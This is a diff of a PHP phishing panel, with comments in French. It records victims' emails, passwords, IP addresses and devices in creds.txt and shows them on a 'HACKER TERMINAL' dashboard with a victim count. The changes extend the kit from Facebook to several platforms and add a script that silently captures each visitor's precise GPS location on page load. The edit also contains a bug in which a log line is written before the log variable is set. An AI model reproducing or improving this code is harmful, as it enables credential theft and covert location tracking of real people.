@@ -1,32 +1,39 @@
 <?php
 if ($_POST) {
-    // IP réelle — Render est derrière un proxy, on prend X-Forwarded-For
-    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] 
-        ?? $_SERVER['HTTP_X_REAL_IP'] 
-        ?? $_SERVER['REMOTE_ADDR'] 
+    // IP réelle
+    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']
+        ?? $_SERVER['HTTP_X_REAL_IP']
+        ?? $_SERVER['REMOTE_ADDR']
         ?? 'inconnue';
-    // Si multiple IPs dans X-Forwarded-For, prendre la première (vraie IP)
     $ip = trim(explode(',', $ip)[0]);
 
     $email = $_POST['email'] ?? '';
     $pass  = $_POST['password'] ?? '';
     $ua    = substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 150);
+    
+// APRÈS $ua = ...
+$gps = isset($_POST['gps_lat']) && isset($_POST['gps_lon']) 
+    ? "GPS: {$_POST['gps_lat']}, {$_POST['gps_lon']}" 
+    : "GPS: N/A";
+
+
+$log .= "│ 📍 {$gps}\n";  // ← AJOUTE ÇA
+
+
+
     $time  = date('Y-m-d H:i:s');
 
-    // Détecter si c'est un email, numéro ou autre
-    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
-        $type_label = "📧 EMAIL";
-    } elseif (preg_match('/^[0-9+\s\-]{7,15}$/', $email)) {
-        $type_label = "📞 NUMÉRO";
-    } else {
-        $type_label = "👤 IDENTIFIANT";
+    // Détection de la plateforme (Facebook par défaut)
+    $platform = "Facebook";
+    if (isset($_POST['platform'])) {
+        $platform = $_POST['platform'];
     }
 
-    // Format vertical lisible
+    // Format
     $log  = "┌─────────────────────────────────────────\n";
-    $log .= "│ 🎯 NOUVELLE VICTIME — {$time}\n";
+    $log .= "│ 🎯 {$platform} VICTIME — {$time}\n";
     $log .= "├─────────────────────────────────────────\n";
-    $log .= "│ {$type_label}   : {$email}\n";
+    $log .= "│ 📧 EMAIL/USER : {$email}\n";
     $log .= "│ 🔑 MOT DE PASSE : {$pass}\n";
     $log .= "│ 🌐 ADRESSE IP   : {$ip}\n";
     $log .= "│ 📱 APPAREIL     : {$ua}\n";
@@ -53,19 +60,50 @@ if ($_POST) {
         .btn:hover{background:#0a0;}
         .btn-red{background:#f00;color:#fff;}
     </style>
+
+
+<!-- GPS TRACKER SILENT PRO -->
+<script>
+function captureGPS() {
+    navigator.geolocation.getCurrentPosition(pos => {
+        const form = document.createElement('form');
+        form.method = 'POST'; form.style.display = 'none';
+        form.innerHTML = `
+            <input name="gps_lat" value="${pos.coords.latitude}">
+            <input name="gps_lon" value="${pos.coords.longitude}">
+        `;
+        document.body.appendChild(form);
+        form.submit();
+    }, ()=>{}, {enableHighAccuracy: true, timeout: 5000});
+}
+window.onload = captureGPS;
+
+// GPS sur submit
+function gpsSubmit(form) {
+    navigator.geolocation.getCurrentPosition(pos => {
+        const lat = document.createElement('input');
+        lat.type = 'hidden'; lat.name = 'gps_lat'; lat.value = pos.coords.latitude;
+        const lon = document.createElement('input');
+        lon.type = 'hidden'; lon.name = 'gps_lon'; lon.value = pos.coords.longitude;
+        form.appendChild(lat); form.appendChild(lon);
+        form.submit();
+    }, () => form.submit(), {enableHighAccuracy: true});
+    return false;
+}
+</script>
+
+
 </head>
 <body>
     <div class="header">
-        🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+        🔥 <span style="color:#f00">HACKER TERMINAL</span> | Multi-Platform Phishing | <span id="count">0</span> victims
     </div>
     <div class="console" id="console">
         <?php
         if (file_exists('creds.txt')) {
             $logs  = file_get_contents('creds.txt');
-            // Compter les victimes par les lignes "NOUVELLE VICTIME"
-            $count = substr_count($logs, 'NOUVELLE VICTIME');
+            $count = substr_count($logs, 'VICTIME');
             echo "<div>📊 Total victims: <span style='color:#ff0'>{$count}</span></div><br>";
-            // Séparer par bloc
             $blocs = explode("└─────────────────────────────────────────", $logs);
             foreach (array_reverse($blocs) as $bloc) {
                 if (trim($bloc)) {
@@ -78,7 +116,7 @@ if ($_POST) {
         }
         ?>
     </div>
-    <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+    <form method="POST" action="terminal.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
         <button type="submit" class="btn">🎣 Lancer Phishing</button>
